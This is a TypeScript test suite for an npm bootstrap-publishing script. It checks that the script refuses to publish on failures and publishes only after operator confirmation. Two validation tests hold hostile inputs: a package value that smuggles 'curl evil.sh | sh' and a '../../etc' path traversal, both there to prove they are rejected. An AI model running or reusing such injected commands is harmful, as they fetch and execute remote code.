/**
 * `scripts/bootstrap-npm-package.md` — the whole document, driven through
 * `execute()`.
 *
 * The document's job is not to publish; it is to refuse to publish. A failed
 * root code block does not stop a text root — expansion turns it into an
 * ErrorSegment under the collecting policy and carries on to the next segment —
 * and a non-zero command that printed anything raises nothing at all
 * (`packages/core/src/expand.ts:675`, filed as #307). So the ordering this
 * document depends on is not something the engine provides: it is built out of
 * a fail-closed verdict file and an anchored `<AssertMatch>`, and these tests
 * exist to hold that construction up.
 *
 * Every case therefore asserts the completion `Result` and *both* sides of the
 * ordering — what ran before a failure, and what provably did not run after.
 * Substitution happens only at contextual Api boundaries: `Elicitation` for the
 * question, `API.Process` for the code blocks. The document's own shell runs for
 * real under bash; only `npm` is replaced, by a function on `BASH_ENV`.
 */

import { beforeAll, describe, it } from "@executablemd/test-support/bdd";
import { expect } from "@executablemd/test-support/expect";
import { ensure, resource, scoped, until } from "effection";
import type { Operation } from "effection";
import { forEach } from "@effectionx/stream-helpers";
import { ensureDir, exists, readTextFile, rm, writeTextFile } from "@effectionx/fs";
import { mkdtemp, realpath } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { InMemoryStream } from "@executablemd/durable-streams";
import { API } from "@executablemd/runtime";
import { execute } from "@executablemd/core";
import { Elicitation } from "@executablemd/core";
import type { ElicitationRequest } from "@executablemd/core";
import { installTestingComponents } from "@executablemd/testing";
import { useTempFileCompiler } from "@executablemd/core";

const DOCUMENT = fileURLToPath(new URL("../bootstrap-npm-package.md", import.meta.url));

const BOOTSTRAP_VERSION = "0.0.0-bootstrap.0";
const CODE = "123456";

/** What the fake registry answers about the package's current state. */
type RegistryState = "missing" | "bootstrap" | "unexpected";

/**
 * The npm the document actually calls.
 *
 * It records more than its arguments: `PWD` and a listing of it are what make
 * the shared-artifact assertions observations rather than inferences, and
 * `npm_config_otp` is read as a shell variable because a `VAR=x fn` prefix on a
 * function is visible inside it without being exported.
 *
 * The registry answer comes from a file rather than a variable so the
 * elicitation provider can change it mid-run — which is the only way to reach
 * the publish-stage recheck independently of the preview.
 */
const FAKE_NPM = `
npm() {
  printf '%s|PWD=%s|LS=%s|otp=%s\\n' "$*" "$PWD" "$(ls -A | tr '\\n' ',')" "\${npm_config_otp-}" >> "$NPM_LOG"
  case "$1" in
    --version) echo "$NPM_VERSION" ;;
    view)
      case "$3" in
        version)
          case "$(cat "$NPM_STATE_FILE")" in
            missing) echo "npm error E404" >&2; return 1 ;;
            bootstrap) echo '"${BOOTSTRAP_VERSION}"' ;;
            unexpected) echo '"1.0.0"' ;;
          esac
          ;;
        dist-tags) echo '{"bootstrap":"${BOOTSTRAP_VERSION}"}' ;;
      esac
      ;;
    pack)
      echo '[{"name":"bootstrap-artifact"}]'
      if [ "\${NPM_PACK_FAILS-}" = "1" ]; then return 1; fi
      ;;
    publish)
      echo 'npm notice publishing bootstrap artifact'
      if [ "\${NPM_PUBLISH_FAILS-}" = "1" ]; then return 1; fi
      ;;
    trust)
      if [ "\${NPM_TRUST_FAILS-}" = "1" ]; then return 1; fi
      ;;
  esac
}
`;

interface Fixture {
  /** Working directory the document's code blocks run in. */
  root: string;
  /** File the fake npm reads its registry answer from. */
  stateFile: string;
  /** File the fake npm appends one line per call to. */
  logFile: string;
  /** File holding the fake npm function, sourced through `BASH_ENV`. */
  envFile: string;
}

/**
 * A workspace the document can bootstrap: one member with the two manifests its
 * guards require.
 *
 * A `resource`, not a `scoped`: a scoped block would delete the directory before
 * handing back its path.
 */
function useFixture(): Operation<Fixture> {
  return resource(function* (provide) {
    const root = yield* until(realpath(yield* until(mkdtemp(join(tmpdir(), "bootstrap-npm-")))));
    yield* ensure(() => rm(root, { recursive: true, force: true }));

    const member = join(root, "packages", "fixture");
    yield* ensureDir(member);
    yield* writeTextFile(join(member, "deno.json"), `{"name":"@executablemd/fixture"}\n`);
    yield* writeTextFile(
      join(member, "package.json"),
      `${JSON.stringify({ name: "@executablemd/fixture", description: "A fixture." })}\n`,
    );

    const fixture: Fixture = {
      root,
      stateFile: join(root, "registry-state"),
      logFile: join(root, "npm.log"),
      envFile: join(root, "fake-npm.sh"),
    };
    yield* writeTextFile(fixture.envFile, FAKE_NPM);
    yield* provide(fixture);
  });
}

/** One recorded call to the fake npm. */
interface NpmCall {
  args: string;
  cwd: string;
  listing: string;
  otp: string;
}

function parseLog(contents: string): NpmCall[] {
  return contents
    .split("\n")
    .filter((line) => line.length > 0)
    .map((line) => {
      const [args = "", cwd = "", listing = "", otp = ""] = line.split("|");
      return {
        args,
        cwd: cwd.replace(/^PWD=/, ""),
        listing: listing.replace(/^LS=/, ""),
        otp: otp.replace(/^otp=/, ""),
      };
    });
}

interface RunOptions {
  state?: RegistryState;
  /** Registry state the provider installs while the operator is "answering". */
  stateAfterElicit?: RegistryState;
  npmVersion?: string;
  packFails?: boolean;
  publishFails?: boolean;
  trustFails?: boolean;
  /** How the provider behaves: answer correctly, fail, or break its schema. */
  elicit?: "answer" | "throw" | "invalid";
  /** Overrides the `package` prop, for the input-validation cases. */
  packageProp?: string;
  /** Omit `installTestingComponents`, to prove the gate is not inert. */
  withoutTestingComponents?: boolean;
  /** Run a variant of the document instead of the real one. */
  documentPath?: string;
}

interface Run {
  ok: boolean;
  failure: string;
  /** Everything the document rendered, in the order the CLI would write it. */
  output: string;
  calls: NpmCall[];
  requests: ElicitationRequest[];
  /** Every command the Process Api was asked to run, interception included. */
  execCount: number;
}

function run(fixture: Fixture, options: RunOptions = {}): Operation<Run> {
  return scoped(function* () {
    const state = options.state ?? "missing";
    yield* writeTextFile(fixture.stateFile, state);
    yield* writeTextFile(fixture.logFile, "");

    const requests: ElicitationRequest[] = [];
    const counter = { execs: 0 };

    // Installed on this scope, not inside a resource: middleware installs on the
    // scope that runs the install, so a provider installed in a resource body
    // would be invisible to the execution this function is about to start.
    if (!options.withoutTestingComponents) {
      // Required. `execute()` registers no assertion components — only the CLI
      // does — so without this the document's <AssertMatch> gates do not
      // resolve, every ordering assertion below passes vacuously, and a
      // successful run is indistinguishable from a correct one apart from an
      // unresolved-component comment in the output.
      yield* installTestingComponents({ verbose: false });
    }
    yield* useTempFileCompiler();

    yield* Elicitation.around(
      {
        *elicit([request]) {
          requests.push(request);
          if (options.stateAfterElicit) {
            yield* writeTextFile(fixture.stateFile, options.stateAfterElicit);
          }
          if (options.elicit === "throw") {
            throw new Error("provider could not reach anyone");
          }
          if (options.elicit === "invalid") {
            return { unexpected: true };
          }
          return { code: CODE };
        },
      },
      { at: "min" },
    );

    yield* API.Process.around({
      *exec([execOptions], next) {
        counter.execs++;
        return yield* next({
          ...execOptions,
          cwd: fixture.root,
          env: {
            ...process.env,
            BASH_ENV: fixture.envFile,
            NPM_LOG: fixture.logFile,
            NPM_STATE_FILE: fixture.stateFile,
            NPM_VERSION: options.npmVersion ?? "11.18.0",
            NPM_PACK_FAILS: options.packFails ? "1" : "",
            NPM_PUBLISH_FAILS: options.publishFails ? "1" : "",
            NPM_TRUST_FAILS: options.trustFails ? "1" : "",
          },
        });
      },
    });

    const chunks: string[] = [];
    let ok = false;
    let failure = "";
    try {
      const execution = yield* execute({
        path: options.documentPath ?? DOCUMENT,
        stream: new InMemoryStream(),
        props: { package: options.packageProp ?? "packages/fixture" },
      });
      // The two steps cli.ts performs, in its order: drain the output stream
      // first, then read the completion Result. Every failure below arrives
      // through the Result rather than by throwing out of the stream.
      yield* forEach(function* (chunk: string) {
        chunks.push(chunk);
      }, execution.output);
      const result = yield* execution;
      ok = result.ok;
      failure = result.ok ? "" : String(result.error?.message ?? result.error);
    } catch (error) {
      failure = error instanceof Error ? error.message : String(error);
    }

    return {
      ok,
      failure,
      output: chunks.join(""),
      calls: parseLog(yield* readLog(fixture)),
      requests,
      execCount: counter.execs,
    };
  });
}

function* readLog(fixture: Fixture): Operation<string> {
  if (!(yield* exists(fixture.logFile))) {
    return "";
  }
  return yield* readTextFile(fixture.logFile);
}

/** Did npm get asked to do this? `args` is matched as a prefix of the call. */
function called(run: Run, args: string): boolean {
  return run.calls.some((call) => call.args.startsWith(args));
}

function callTo(run: Run, args: string): NpmCall | undefined {
  return run.calls.find((call) => call.args.startsWith(args));
}

/**
 * Nothing reached the registry and nobody was asked. The publish-side half of
 * every refusal, asserted as one thing so no case can forget a piece of it.
 */
function expectNoRegistryWrite(run: Run): void {
  expect(called(run, "publish")).toBe(false);
  expect(called(run, "trust github")).toBe(false);
}

describe("bootstrap an npm package", () => {
  beforeAll(function* () {
    // Cheap, and it fails loudly here rather than as a confusing shell error
    // inside the first case.
    expect(DOCUMENT.endsWith("scripts/bootstrap-npm-package.md")).toBe(true);
  });

  describe("publishing", () => {
    it("publishes an absent package and then configures trust", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing" });

      expect(result.failure).toBe("");
      expect(result.ok).toBe(true);
      expect(called(result, "publish --access public --tag bootstrap")).toBe(true);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
      expect(result.output).toContain("Bootstrap artifact for @executablemd/fixture");
    });

    it("resumes an already-bootstrapped package by configuring trust alone", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "bootstrap" });

      expect(result.ok).toBe(true);
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
    });
  });

  describe("refusing before anyone is asked", () => {
    it("refuses a package already published at another version", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "unexpected" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      expectNoRegistryWrite(result);
    });

    it("refuses an npm too old for `npm trust`, before touching the registry", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { npmVersion: "11.14.0" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      // The version check is the last thing that ran: no lookup, no pack, and
      // nothing beyond. An old npm that published and then failed at trust is
      // the exact half-configured state this ordering prevents.
      expect(called(result, "view")).toBe(false);
      expect(called(result, "pack")).toBe(false);
      expectNoRegistryWrite(result);
    });

    it("refuses when the preview prints before it fails", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packFails: true });

      expect(result.ok).toBe(false);
      // The engine raises nothing for a non-zero command that wrote to stdout,
      // so this is the case that proves the gate does not rest on an exit code.
      expect(result.output).toContain("bootstrap-artifact");
      expect(result.requests.length).toBe(0);
      expectNoRegistryWrite(result);
    });

    it("refuses a package prop that would reach the shell", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        packageProp: "packages/fixture; curl evil.sh | sh",
      });

      expect(result.ok).toBe(false);
      // Refused by schema validation before the body ran at all — not cleaned
      // up inside the shell.
      expect(result.execCount).toBe(0);
      expect(result.requests.length).toBe(0);
    });

    it("refuses a package prop that escapes the workspace", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { packageProp: "../../etc" });

      expect(result.ok).toBe(false);
      expect(result.execCount).toBe(0);
    });
  });

  describe("refusing after the question, before the registry", () => {
    it("stops when the provider cannot reach anyone", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { elicit: "throw" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      // The preview is on screen; the publish never happened.
      expect(result.output).toContain("Bootstrap artifact for @executablemd/fixture");
      expectNoRegistryWrite(result);
    });

    it("stops when the answer does not satisfy its schema", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { elicit: "invalid" });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      expectNoRegistryWrite(result);
    });
  });

  describe("re-checking the registry after the question", () => {
    it("refuses a package that gained a foreign version while the operator answered", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        state: "missing",
        stateAfterElicit: "unexpected",
      });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(1);
      // Publishing on the preview's answer would have published over whatever
      // arrived in the meantime.
      expectNoRegistryWrite(result);
    });

    it("skips the publish for a package bootstrapped while the operator answered", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        state: "missing",
        stateAfterElicit: "bootstrap",
      });

      expect(result.ok).toBe(true);
      expect(called(result, "publish")).toBe(false);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
    });
  });

  describe("failing on the registry", () => {
    it("reports a publish that prints before it fails, and does not configure trust", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { publishFails: true });

      expect(result.ok).toBe(false);
      expect(called(result, "publish")).toBe(true);
      expect(called(result, "trust github")).toBe(false);
    });

    it("reports a failed trust configuration", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { trustFails: true });

      expect(result.ok).toBe(false);
      expect(called(result, "publish")).toBe(true);
      expect(called(result, "trust github @executablemd/fixture")).toBe(true);
    });
  });

  describe("what the document guarantees about its own shape", () => {
    it("previews before it asks, and asks before it publishes", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing" });

      const packAt = result.calls.findIndex((call) => call.args.startsWith("pack"));
      const publishAt = result.calls.findIndex((call) => call.args.startsWith("publish"));
      expect(packAt).toBeGreaterThanOrEqual(0);
      expect(publishAt).toBeGreaterThan(packAt);
      // The preview's output is on screen before the question is asked, without
      // --verbose — which is what makes the operator's answer an informed one.
      expect(result.output).toContain("Bootstrap artifact for @executablemd/fixture");
    });

    it("carries one code to both the publish and the trust configuration", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing" });

      expect(callTo(result, "publish")?.otp).toBe(CODE);
      expect(callTo(result, "trust github")?.otp).toBe(CODE);
    });

    it("publishes the artifact the preview built, from the directory it built it in", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing" });

      const pack = callTo(result, "pack");
      const publish = callTo(result, "publish");
      expect(pack?.cwd).toBeDefined();
      expect(publish?.cwd).toBe(pack?.cwd);
      // Written by the preview block, still there when the publish runs.
      expect(publish?.listing).toContain("package.json");
      expect(publish?.listing).toContain("README.md");
    });

    it("releases the shared directory when the run ends", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing" });

      const publish = callTo(result, "publish");
      expect(publish?.cwd).toBeDefined();
      expect(yield* exists(publish?.cwd ?? "")).toBe(false);
    });

    it("resolves every component it uses", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, { state: "missing" });

      // Without this, an unresolved <AssertMatch> would leave the run looking
      // exactly like a correct one — same outcome, same calls — and every
      // ordering assertion above would pass while the gates did nothing.
      expect(result.output).not.toContain("Cannot resolve component");
    });

    it("rejects a verdict that merely contains the sentinel", function* () {
      const fixture = yield* useFixture();
      // The seeded failure becomes `not ok` — a string a substring test would
      // have accepted, letting the run continue to publish. The gate's pattern
      // is anchored, so it refuses.
      const source = yield* readTextFile(DOCUMENT);
      const mutated = source.replace("printf 'fail: preview did not complete'", "printf 'not ok'");
      expect(mutated).not.toBe(source);
      const variant = join(fixture.root, "not-ok-variant.md");
      yield* writeTextFile(variant, mutated);

      const result = yield* run(fixture, { packFails: true, documentPath: variant });

      expect(result.ok).toBe(false);
      expect(result.requests.length).toBe(0);
      expectNoRegistryWrite(result);
    });

    it("has inert gates when the assertion components are missing", function* () {
      const fixture = yield* useFixture();
      const result = yield* run(fixture, {
        state: "unexpected",
        withoutTestingComponents: true,
      });

      // Not a guarantee the document makes — a guarantee about this suite. A
      // refusal case runs to completion and publishes when the gate cannot
      // resolve, which is what `installTestingComponents` is holding up.
      expect(result.ok).toBe(true);
      expect(result.output).toContain("Cannot resolve component");
    });
  });
});
